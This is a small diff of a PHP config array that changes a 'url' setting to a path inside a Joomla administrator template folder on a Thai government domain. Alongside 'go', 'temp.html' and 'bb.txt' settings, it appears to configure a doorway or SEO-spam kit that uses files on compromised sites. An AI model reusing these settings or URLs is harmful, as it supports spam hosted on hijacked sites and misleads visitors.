@@ -1,6 +1,6 @@
 <?php
 $config = array(
-        'url'		=> 'https://wws.kkn2.go.th/style/',
+        'url'		=> 'https://www.lp-pao.go.th/Main60/administrator/templates/hathor/html/com_admin/sysinfo/asia/',
         'parameter' => 'go',
         'template'  => 'temp.html',
         'keywords'  => 'bb.txt',
